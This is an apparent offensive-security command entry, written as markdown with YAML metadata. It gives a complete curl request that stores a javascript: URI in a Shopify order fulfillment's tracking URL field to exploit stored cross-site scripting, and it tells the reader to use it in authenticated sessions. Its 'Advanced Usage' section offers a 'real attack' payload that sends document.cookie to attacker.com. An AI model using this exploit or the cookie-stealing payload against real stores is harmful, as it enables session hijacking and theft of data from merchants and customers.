---
data: >-
  curl -X POST
  "https://<your-store>.myshopify.com/admin/orders/<order-id>/fulfillments/<fulfillment-id>"
  -H "Accept: text/html, application/xhtml+xml, application/xml" -H
  "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.8" -H
  "Connection: keep-alive" -H "Content-Type: application/x-www-form-urlencoded;
  charset=UTF-8" -H "Cookie: <cookies>" -H "X-CSRF-Token: <YOUR_TOKEN>" -H
  "X-Requested-With: XMLHttpRequest" -d
  "utf8=%E2%9C%93&_method=put&authenticity_token=<CSRF_TOKEN>&fulfillment[tracking_numbers][]=TrackingNumber&fulfillment[tracking_urls][]=javascript:alert(1);//&fulfillment[tracking_company]=Other&fulfillment[notify_customer]=false&fulfillment[notify_customer]=true"
tags:
  - xss
  - injection
  - shopify
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:31.665Z'
id: 32324cf1-bde6-43e3-b0cb-b507f80996a5
verified: false
validated: true
submitted: true
---
# shopify-update-fulfillment-malicious-url

## Command

```bash
curl -X POST "https://<your-store>.myshopify.com/admin/orders/<order-id>/fulfillments/<fulfillment-id>" -H "Accept: text/html, application/xhtml+xml, application/xml" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.8" -H "Connection: keep-alive" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Cookie: <cookies>" -H "X-CSRF-Token: <YOUR_TOKEN>" -H "X-Requested-With: XMLHttpRequest" -d "utf8=%E2%9C%93&_method=put&authenticity_token=<CSRF_TOKEN>&fulfillment[tracking_numbers][]=TrackingNumber&fulfillment[tracking_urls][]=javascript:alert(1);//&fulfillment[tracking_company]=Other&fulfillment[notify_customer]=false&fulfillment[notify_customer]=true"
```

## Description

This curl command updates a Shopify fulfillment record via POST (emulating PUT) to inject a malicious javascript:alert(1);// URL into the tracking_urls field, exploiting stored XSS. Use in authenticated sessions to store the payload for later triggering.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL placeholders (<your-store>, <order-id>, <fulfillment-id>) | Replace with actual store, order, and fulfillment IDs | Yes |
| Cookie: <cookies> | Session cookies for authentication | Yes |
| X-CSRF-Token: <YOUR_TOKEN> | CSRF protection token from admin page | Yes |
| authenticity_token=<CSRF_TOKEN> | Matches the header token for validation | Yes |
| fulfillment[tracking_urls][] | Malicious URL payload (e.g., javascript:alert(1);//) | Yes |
| _method=put | Overrides POST to PUT for update | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://example.myshopify.com/admin/orders/123/fulfillments/456" [headers and data as above]
```

### Advanced Usage

Modify payload for real attack, e.g., fulfillment[tracking_urls][]=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie);

```bash
curl [same as basic but with advanced payload]
```

## Expected Output

HTTP 200 OK response body indicating successful update, or a redirect to the order page. No errors if tokens are valid; the malicious link is now stored.

## Related

- [[procedures/Update-Fulfillment-with-JavaScript-URI-for-Stored-XSS]]
